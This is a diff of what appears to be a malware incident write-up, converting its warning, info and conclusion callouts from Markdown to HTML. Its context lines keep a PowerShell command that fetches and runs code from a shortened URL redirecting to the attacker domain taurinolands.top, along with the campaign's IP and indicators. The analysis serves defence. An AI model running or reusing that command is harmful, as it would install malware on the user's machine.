@@ -60,7 +60,15 @@ Invoke-Expression (Invoke-RestMethod 'https://tinyurl.com/mtrcktxm')
 
 That TinyURL redirects to `taurinolands.top`.
 
-> [!warning] Malware Behaviors Detected Falcon also flagged behaviors consistent with malware execution: DNS lookups, HTTP/HTTPS connections, file writes (ZIP, EXE, OLE, PDF), WMI reconnaissance, scheduled task modification attempts, and injection activity. Falcon killed the process before the second stage ran fully.
+<div class="callout callout-warning">
+    <div class="callout-title">
+        <span class="callout-icon"></span>
+        Warning
+    </div>
+    <div class="callout-content">
+        <strong>Malware Behaviors Detected</strong> Falcon also flagged behaviors consistent with malware execution: DNS lookups, HTTP/HTTPS connections, file writes (ZIP, EXE, OLE, PDF), WMI reconnaissance, scheduled task modification attempts, and injection activity. Falcon killed the process before the second stage ran fully.
+    </div>
+</div>
 
 ---
 
@@ -113,7 +121,15 @@ https://taurinolands.top/web/store/articles
 
 That endpoint returned `204 No Content`, consistent with filtering.
 
-> [!info] Domain Registration WHOIS showed `taurinolands.top` was registered Sept 8, 2025, via NameSilo with full privacy. DNS resolved it to `212.11.64.164` (nginx/1.18.0 on Ubuntu).
+<div class="callout callout-info">
+    <div class="callout-title">
+        <span class="callout-icon"></span>
+        Info
+    </div>
+    <div class="callout-content">
+        <strong>Domain Registration</strong> WHOIS showed `taurinolands.top` was registered Sept 8, 2025, via NameSilo with full privacy. DNS resolved it to `212.11.64.164` (nginx/1.18.0 on Ubuntu).
+    </div>
+</div>
 
 ---
 
@@ -232,7 +248,15 @@ graph TD
 
 
 
-> [!success] Conclusion Falcon successfully blocked execution on our host, but this was a real and sophisticated campaign, using a legitimate website as delivery, heavy cloaking, and professional malware families. This security event does not appear to be well know, so please continue with caution.
+<div class="callout callout-success">
+    <div class="callout-title">
+        <span class="callout-icon"></span>
+        Success
+    </div>
+    <div class="callout-content">
+        <strong>Conclusion</strong> Falcon successfully blocked execution on our host, but this was a real and sophisticated campaign, using a legitimate website as delivery, heavy cloaking, and professional malware families. This security event does not appear to be well know, so please continue with caution.
+    </div>
+</div>
 
 ### [Any.Run Report](https://any.run/report/d4c9d9027326271a89ce51fcaf328ed673f17be33469ff979e8ab8dd501e664f/f9336409-d7a5-4a03-a9fc-a70473472afd)
 
